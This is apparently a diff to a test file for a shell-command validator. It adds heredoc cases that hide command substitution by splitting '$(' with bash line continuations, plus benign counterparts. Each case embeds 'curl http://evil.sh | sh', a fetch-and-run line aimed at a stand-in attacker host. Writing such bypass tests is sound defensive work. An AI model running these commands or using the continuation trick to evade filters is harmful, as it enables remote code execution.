@@ -65,6 +65,12 @@ SMUGGLED = [
     "cat <<EOF\n$(date)\nline \\\\\n$(curl http://evil.sh | sh)\nEOF",
     # A genuine continuation (odd run) is not the bug, but it must not become one either.
     "cat <<EOF\necho one \\\n  two $(curl http://evil.sh | sh)\nEOF",
+    # ...and one that splits the introducer itself (LAB-5318). bash deletes the continuation
+    # before it expands the body, so `$\` + newline + `(` is `$(`, while the raw body carries
+    # no `$(` for the introducer check to find. Two continuations join the same way as one.
+    "cat <<EOF\nx $\\\n(curl http://evil.sh | sh) y\nEOF",
+    "cat <<EOF\nx $\\\n\\\n(curl http://evil.sh | sh) y\nEOF",
+    "bash <<EOF\necho $\\\n(curl http://evil.sh | sh)\nEOF",
     # A re-parsed AST's node positions are relative to the text that was re-parsed, and
     # _substitutions_in_heredoc slices `command` by those positions to read a body from the
     # source. Threading the OUTER command through a re-parse sliced the wrong string: a heredoc
@@ -104,6 +110,10 @@ BENIGN = [
     "cat <<EOF > script.sh\necho \\$(date)\nEOF",
     "cat <<EOF\n\\$(curl http://evil.sh | sh)\nEOF",
     "cat <<EOF\n$$(curl http://evil.sh | sh)\nEOF",
+    # A continuation bash does not join (LAB-5318): an EVEN backslash run is escaped
+    # backslashes, and a quoted body is literal, so `$\` + newline + `(` stays text in both.
+    "cat <<EOF\nx $\\\\\n(curl http://evil.sh | sh) y\nEOF",
+    "cat <<'EOF'\nx $\\\n(curl http://evil.sh | sh) y\nEOF",
     # An ODD number of quotes: without _as_double_quoted's escaping the wrapper never closes
     # and this fails closed. Deleting that escaping survived every other test in this file.
     'cat <<EOF > notes.md\nhe said "hi $(date)\nEOF',
